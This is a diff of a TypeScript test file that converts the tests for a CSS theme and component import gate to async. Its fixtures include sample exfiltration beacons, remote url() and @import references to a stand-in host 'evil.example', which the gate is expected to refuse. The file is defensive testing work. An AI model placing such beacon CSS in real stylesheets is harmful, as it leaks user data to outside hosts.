@@ -21,73 +21,73 @@ import { refuseImportedComponent, refuseImportedTheme } from './import-gate';
 const CLEAN_THEME = "/* @theme mine */\n@import 'lattice';\n:root{--accent:#2f6feb;--bg:#fff;--text-body:#111}";
 
 describe('refuseImportedTheme', () => {
-	it('refuses a remote url() — the beacon', () => {
-		const r = refuseImportedTheme(`${CLEAN_THEME}\n:root{--leak:url(https://evil.example/?deck)}`, 'Hostile');
+	it('refuses a remote url() — the beacon', async () => {
+		const r = await refuseImportedTheme(`${CLEAN_THEME}\n:root{--leak:url(https://evil.example/?deck)}`, 'Hostile');
 		expect(r).not.toBeNull();
 		expect(r?.why).toMatch(/remote resource/);
 		expect(r?.name).toBe('Hostile');
 	});
 
-	it('refuses @import url(…)', () => {
-		expect(refuseImportedTheme(`@import url(https://evil.example/x.css);\n${CLEAN_THEME}`, 'X')).not.toBeNull();
+	it('refuses @import url(…)', async () => {
+		expect(await refuseImportedTheme(`@import url(https://evil.example/x.css);\n${CLEAN_THEME}`, 'X')).not.toBeNull();
 	});
 
-	it('refuses an import of a theme the receiving browser does not have', () => {
+	it('refuses an import of a theme the receiving browser does not have', async () => {
 		// It would not resolve there anyway, and since #1841 the engine drops rather
 		// than hoists it — but a stranger's bundle asserting a palette you may or may
 		// not have is not something to store on a maybe.
-		expect(refuseImportedTheme("@import 'someones-palette';\n:root{--accent:#111}", 'X')).not.toBeNull();
+		expect(await refuseImportedTheme("@import 'someones-palette';\n:root{--accent:#111}", 'X')).not.toBeNull();
 	});
 
-	it('allows a clean theme', () => {
-		expect(refuseImportedTheme(CLEAN_THEME, 'Mine')).toBeNull();
+	it('allows a clean theme', async () => {
+		expect(await refuseImportedTheme(CLEAN_THEME, 'Mine')).toBeNull();
 	});
 
-	it('allows a token whose NAME contains "javascript"', () => {
+	it('allows a token whose NAME contains "javascript"', async () => {
 		// `CSS_EXFIL_RULES`'s `css-scheme` rule matches `javascript:` inside the property
 		// name, so a plausible syntax-highlight token trips it. Measured against the gate:
 		// `blocked: true`. It is a finding, never a refusal — a `javascript:` URL in a
 		// stylesheet cannot execute in any shipping browser, so vetoing on it buys
 		// nothing and costs a legitimate import.
-		expect(refuseImportedTheme(`${CLEAN_THEME}\n:root{--code-javascript:#f0db4f}`, 'Code')).toBeNull();
+		expect(await refuseImportedTheme(`${CLEAN_THEME}\n:root{--code-javascript:#f0db4f}`, 'Code')).toBeNull();
 	});
 
-	it('allows a theme that merely fails the token contract', () => {
+	it('allows a theme that merely fails the token contract', async () => {
 		// Wrong, and it still renders. Conformance is never a refusal.
-		expect(refuseImportedTheme("/* @theme sparse */\n@import 'lattice';\n:root{--accent:#111}", 'Sparse')).toBeNull();
+		expect(await refuseImportedTheme("/* @theme sparse */\n@import 'lattice';\n:root{--accent:#111}", 'Sparse')).toBeNull();
 	});
 
-	it('allows a data: URI and a #fragment ref', () => {
+	it('allows a data: URI and a #fragment ref', async () => {
 		const css = `${CLEAN_THEME}\n:root{--icon:url("data:image/svg+xml;base64,PHN2Zy8+");--clip:url(#frag)}`;
-		expect(refuseImportedTheme(css, 'Inline')).toBeNull();
+		expect(await refuseImportedTheme(css, 'Inline')).toBeNull();
 	});
 });
 
 describe('refuseImportedComponent', () => {
-	it('refuses a remote url() in component CSS', () => {
+	it('refuses a remote url() in component CSS', async () => {
 		// The component arm of the SAME zip was ungated while the theme arm was not.
 		// Hostile component CSS reaches the same preview <style> and every export, and
 		// the intended workflow — import, then insert the skeleton — is what fires it.
-		const r = refuseImportedComponent('section.widget .leak{background:url(https://evil.example/?d)}', 'widget');
+		const r = await refuseImportedComponent('section.widget .leak{background:url(https://evil.example/?d)}', 'widget');
 		expect(r).not.toBeNull();
 		expect(r?.why).toMatch(/remote resource/);
 	});
 
-	it('refuses @import in component CSS', () => {
-		expect(refuseImportedComponent("@import url(//evil.example/x);\nsection.w .a{color:red}", 'w')).not.toBeNull();
+	it('refuses @import in component CSS', async () => {
+		expect(await refuseImportedComponent("@import url(//evil.example/x);\nsection.w .a{color:red}", 'w')).not.toBeNull();
 	});
 
-	it('allows clean scoped component CSS', () => {
-		expect(refuseImportedComponent('section.widget .title{color:var(--text-heading)}', 'widget')).toBeNull();
+	it('allows clean scoped component CSS', async () => {
+		expect(await refuseImportedComponent('section.widget .title{color:var(--text-heading)}', 'widget')).toBeNull();
 	});
 
-	it('allows a component whose class is named "javascript"', () => {
+	it('allows a component whose class is named "javascript"', async () => {
 		// A code component naming a language class is exactly the shape that trips the
 		// `css-scheme` rule on a SELECTOR rather than on a URL.
-		expect(refuseImportedComponent('section.code .javascript{color:var(--accent)}', 'code')).toBeNull();
+		expect(await refuseImportedComponent('section.code .javascript{color:var(--accent)}', 'code')).toBeNull();
 	});
 
-	it('allows an inline data: icon — the sanctioned non-network url()', () => {
-		expect(refuseImportedComponent('section.w .i{background:url("data:image/svg+xml;base64,PHN2Zy8+")}', 'w')).toBeNull();
+	it('allows an inline data: icon — the sanctioned non-network url()', async () => {
+		expect(await refuseImportedComponent('section.w .i{background:url("data:image/svg+xml;base64,PHN2Zy8+")}', 'w')).toBeNull();
 	});
 });
